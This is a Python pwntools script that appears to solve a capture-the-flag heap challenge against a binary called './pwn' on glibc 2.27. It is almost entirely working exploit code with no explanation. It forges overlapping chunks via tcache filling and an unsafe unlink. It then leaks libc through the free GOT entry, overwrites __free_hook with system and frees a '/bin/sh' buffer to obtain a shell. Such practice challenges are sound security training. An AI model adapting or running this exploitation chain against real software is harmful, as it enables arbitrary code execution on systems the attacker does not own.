#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]
if local :
    argv=["/glibc/x64/2.27/lib/ld-2.27.so","--library-path","/glibc/x64/2.27/lib/","./pwn"]
    a=process(argv=argv)
    libc=ELF("/glibc/x64/2.27/lib/libc-2.27.so")
else:
    a=remote("")

def debug():
    gdb.attach(a,'''
    b *0x0000000004012E1
    b *0x000000000401397
    ''')
def menu(index):
    a.recvuntil("4.show\n")
    a.send(str(index))
def add(index,content):
    menu(1)
    a.recvuntil("index:\n")
    a.send(str(index))
    a.recvuntil("gift: ")
    heap=int(a.recvuntil("\n",drop=True),16)
    a.recvuntil("content:\n")
    a.send(content)
    return heap
def delete(index):
    menu(2)
    a.recvuntil("index:\n")
    a.send(str(index))
def edit(index,content):
    menu(3)
    a.recvuntil("index:\n")
    a.send(str(index))
    a.recvuntil("content:\n")
    a.send(content)
def show(index):
    menu(4)
    a.recvuntil("index:\n")
    a.send(str(index))

edit_flag=0x00000000040418C
show_flag=0x000000000404188
chunk_ptr=0x000000000404080

for i in range(7):
    add(2*i,'A')
    add(2*i+1,'A')
    delete(2*i)
    add(2*i,'A'*0x28+'\x91')
for i in range(7):
    delete(2*i+1)#fill 0x90 tcache

add(1,'A')#0
add(3,'A')#0x30
add(5,'A')#0x60
add(7,'A')#0x90
heap9_addr=add(9,'A')#0xc0
add(19,'A')
add(20,'A')
add(21,'A')

success("heap9_addr ==> 0x%x"%heap9_addr)
delete(1)
add(1,'A'*0x28+'\x91')
delete(3)
add(3,'A')    
add(11,'A')# 11 = 5
heap13_addr=add(13,'A')# 13 = 7 
fuck_chunk_addr=heap13_addr-0x380+0x10
success("fuck_chunk_addr ==> 0x%x"%fuck_chunk_addr)
#debug()
delete(13)
delete(11)
delete(19)
delete(5)

add(5,p64(fuck_chunk_addr))
add(15,'A')
add(13,'A')
fuck_chunk_ptr=0x404060


payload=p64(0)+p64(0x391)
payload+=p64(fuck_chunk_ptr-24)+p64(fuck_chunk_ptr-16)
add(17,payload)
delete(7)
add(7,'A'*0x20+p64(0x390)+'\x90')
#delete(9)# unlink , 
delete(20)
delete(5)
delete(21)
delete(13)

add(5,p64(0x404178))
add(24,'A')
add(13,'A')
delete(9)#unlink
add(23,p64(0x000000000403FA0)+p64(0)+p32(1)+p32(2))# 
'''
delete(5)
delete(13)
add(5,p64(0x000000000404080))
add(13,'A')
add(25,p64(0x000000000403FA0))# chunk_ptr[0]=free_got
'''
show(31)
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["free"]
system_addr=libc_base+libc.symbols["system"]
success("system_addr ==> 0x%x"%system_addr)
free_hook=libc_base+libc.symbols["__free_hook"]
edit(23,p64(free_hook))
edit(31,p64(system_addr))
edit(23,"/bin/sh\x00")
#debug()
delete(23)

a.interactive()